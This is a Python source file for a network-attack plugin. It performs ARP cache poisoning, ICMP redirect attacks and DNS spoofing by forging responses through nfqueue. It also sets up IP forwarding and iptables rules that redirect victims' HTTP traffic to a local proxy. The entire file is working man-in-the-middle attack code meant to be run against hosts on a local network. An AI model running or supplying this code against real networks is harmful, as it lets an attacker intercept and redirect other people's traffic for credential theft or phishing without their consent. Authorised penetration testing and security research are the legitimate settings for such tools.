#
# DNS Spoofing code has been stolen from https://github.com/DanMcInerney/dnsspoof/
#

from twisted.internet import reactor
from twisted.internet.interfaces import IReadDescriptor
from plugins.plugin import Plugin
from time import sleep
import nfqueue
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #Gets rid of IPV6 Error when importing scapy
from scapy.all import *
import os
import sys
import threading

try:
    from configobj import ConfigObj
except:
    sys.exit('[-] configobj library not installed!')

class Spoof(Plugin):
    name = "Spoof"
    optname = "spoof"
    desc = 'Redirect traffic using ICMP, ARP or DNS'
    has_opts = True

    def initialize(self,options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options
        self.interface = options.interface
        self.arp = options.arp
        self.icmp = options.icmp
        self.dns = options.dns
        #self.dhcp = options.dhcp
        self.domain = options.domain
        self.dnsip = options.dnsip
        self.dnscfg = options.dnscfg
        self.gateway = options.gateway
        self.summary = options.summary
        self.target = options.target
        self.arpmode = options.arpmode
        self.port = self.options.listen
        self.manualiptables = options.manualiptables #added by alexander.georgiev@daloo.de
        self.debug = False
        self.send = True

        if os.geteuid() != 0:
            sys.exit("[-] Spoof plugin requires root privileges")

        if self.options.log_level == 'debug':
            self.debug = True

        print "[*] Spoof plugin online"
        if not self.manualiptables:
            os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')

        if self.arp == True:
            if self.icmp == True:
                sys.exit("[-] --arp and --icmp are mutually exclusive")

            if (not self.interface or not self.gateway):
                sys.exit("[-] ARP Spoofing requires --gateway and --iface")

            self.mac = get_if_hwaddr(self.interface)
            self.routermac = getmacbyip(self.gateway)
            print "[*] ARP Spoofing enabled"
            if self.arpmode == 'req':
                pkt = self.build_arp_req()
            elif self.arpmode == 'rep':
                pkt = self.build_arp_rep()

        elif self.icmp == True:
            if self.arp == True:
                sys.exit("[-] --icmp and --arp are mutually exclusive")

            if (not self.interface or not self.gateway or not self.target):
                sys.exit("[-] ICMP Redirection requires --gateway, --iface and --target")
            
            self.mac = get_if_hwaddr(self.interface)
            self.routermac = getmacbyip(self.gateway)
            print "[*] ICMP Redirection enabled"
            pkt = self.build_icmp()

        if self.summary == True:
            pkt.show()
            ans = raw_input('\n[*] Continue? [Y|n]: ').lower()
            if ans == 'y' or len(ans) == 0:
                pass
            else:
                sys.exit(0)

        if self.dns == True:
            if not self.dnscfg:
                if (not self.dnsip or not self.domain):
                    sys.exit("[-] DNS Spoofing requires --domain, --dnsip")
            elif self.dnscfg:
                self.dnscfg = ConfigObj(self.dnscfg)
            
            if not self.manualiptables:
                os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
            print "[*] DNS Spoofing enabled"
            self.start_dns_queue()

        file = open('/proc/sys/net/ipv4/ip_forward', 'w')
        file.write('1')
        file.close()
        if not self.manualiptables:
            print '[*] Setting up iptables rules'
            os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port %s' % self.port)

        t = threading.Thread(name='send_packets', target=self.send_packets, args=(pkt,self.interface,self.debug,))
        t.setDaemon(True)
        t.start()
  
    def send_packets(self,pkt,interface, debug):
        while self.send == True:
            sendp(pkt, inter=2, iface=interface, verbose=debug)
    
    def build_icmp(self):
        pkt = IP(src=self.gateway, dst=self.target)/ICMP(type=5, code=1, gw=get_if_addr(self.interface))/\
              IP(src=self.target, dst=self.gateway)/UDP()

        return pkt

    def build_arp_req(self):
        if self.target == None:
            pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac, psrc=self.gateway, pdst=self.gateway)
        elif self.target:
            target_mac = getmacbyip(self.target)
            if target_mac == None:
                sys.exit("[-] Error: Could not resolve targets MAC address")
                
            pkt = Ether(src=self.mac, dst=target_mac)/ARP(hwsrc=self.mac, psrc=self.gateway, hwdst=target_mac, pdst=self.target)
        
        return pkt

    def build_arp_rep(self):
        if self.target == None:
            pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac, psrc=self.gateway, op=2)
        elif self.target:
            target_mac = getmacbyip(self.target)
            if target_mac == None:
                sys.exit("[-] Error: Could not resolve targets MAC address")
                
            pkt = Ether(src=self.mac, dst=target_mac)/ARP(hwsrc=self.mac, psrc=self.gateway, hwdst=target_mac, pdst=self.target, op=2)

        return pkt

    def nfqueue_callback(self, i, payload):
        data = payload.get_data()
        pkt = IP(data)
        if not pkt.haslayer(DNSQR):
            payload.set_verdict(nfqueue.NF_ACCEPT)
        else:
            if self.dnscfg:
                for k,v in self.dnscfg.items():
                    if k in pkt[DNS].qd.qname:
                        self.modify_dns(payload, pkt, v)
            
            elif self.domain in pkt[DNS].qd.qname:
                self.modify_dns(payload, pkt, self.dnsip)

    def modify_dns(self, payload, pkt, ip):
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=ip))

        payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
        logging.info("%s Spoofed DNS packet for %s" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))

    def start_dns_queue(self):
        self.q = nfqueue.queue()
        self.q.set_callback(self.nfqueue_callback)
        self.q.fast_open(0, socket.AF_INET)
        self.q.set_queue_maxlen(5000)
        reactor.addReader(self)
        self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
    
    def fileno(self):
        return self.q.get_fd()
    
    def doRead(self):
        self.q.process_pending(100)
    
    def connectionLost(self, reason):
        reactor.removeReader(self)
    
    def logPrefix(self):
        return 'queue'

    def add_options(self,options):
        options.add_argument('--arp', dest='arp', action='store_true', default=False, help='Redirect traffic using ARP Spoofing')
        options.add_argument('--icmp', dest='icmp', action='store_true', default=False, help='Redirect traffic using ICMP Redirects')
        options.add_argument('--dns', dest='dns', action='store_true', default=False, help='Redirect DNS requests')
       # options.add_argument('--dhcp', dest='dhcp', action='store_true', default=False, help='Redirect traffic using fake DHCP offers')
        options.add_argument('--iface', dest='interface', help='Specify the interface to use')
        options.add_argument('--gateway', dest='gateway', help='Specify the gateway IP')
        options.add_argument('--target', dest='target', help='Specify a host to poison [default: subnet]')
        options.add_argument('--arpmode', dest='arpmode', default='req', help=' ARP Spoofing mode: requests (req) or replies (rep) [default: req]')
        options.add_argument('--summary', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')
        options.add_argument('--domain', type=str, dest='domain', help='Domain to spoof [e.g google.com]')
        options.add_argument('--dnsip', type=str, dest='dnsip', help='IP address to resolve dns queries to')
        options.add_argument("--dnscfg", type=file, help="Specify a config file")
        options.add_argument('--manualiptables', dest='manualiptables', action='store_true', default=False, help='Do not setup iptables of flush iptables rules automatically')

    def finish(self):
        self.send = False
        sleep(3)
        file = open('/proc/sys/net/ipv4/ip_forward', 'w')
        file.write('0')
        file.close()
        if not self.manualiptables:
            print '\n[*] Flushing iptables rules'
            os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')

        if self.dns == True:
            self.q.unbind(socket.AF_INET)
            self.q.close()
        
        if self.arp == True:
            print '[*] Re-arping network'
            pkt = Ether(src=self.routermac, dst='ff:ff:ff:ff:ff:ff')/ARP(psrc=self.gateway, hwsrc=self.routermac, op=2)
            sendp(pkt, inter=1, count=5, iface=self.interface)